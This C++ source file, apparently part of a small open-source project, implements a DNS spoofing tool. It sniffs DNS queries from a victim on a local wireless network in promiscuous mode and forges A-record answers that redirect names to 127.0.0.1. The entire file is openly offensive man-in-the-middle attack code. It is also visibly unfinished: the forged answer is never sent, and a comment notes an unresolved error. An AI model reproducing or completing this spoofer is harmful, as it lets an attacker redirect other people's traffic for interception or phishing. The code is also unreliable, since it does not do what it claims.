/*The MIT License (MIT)
*
* Copyright (c) 2016 5kyc1ad(SangHyeon Jeon)
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/


#include "dns_spoofer.h"

DNS_Spoofer::DNS_Spoofer(char *_gateway, char *_victim, char *_server) : NW_Info(_gateway, _victim), m_server(_server) { }

void DNS_Spoofer::startSniffing() {
    std::clog << "[*] Ready to Sniffing " << std::endl;
    m_config.set_filter(std::string("udp and dst port 53"));
    m_config.set_promisc_mode(true);
    m_sniffer = Sniffer("wlan0", m_config);
    std::clog << "[*] Start Sniffing" << std::endl;
    m_sniffer.sniff_loop(make_sniffer_handler(this, &DNS_Spoofer::packetHandler));
}

bool DNS_Spoofer::packetHandler(PDU &pdu) {
    try {
        std::clog << "Packet Find" << std::endl;
        DNS dns = pdu.rfind_pdu<RawPDU>().to<DNS>();
        if(dns.type() == DNS::QUERY) {
            for (auto &query : dns.queries()) {
                if (query.query_type() == DNS::A) {
                    dns.add_answer(DNS::resource(query.dname(), "127.0.0.1", DNS::A, query.query_class(), 777)); // Error occured...
                }
            }
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart" << std::endl;
    }
    return true;
}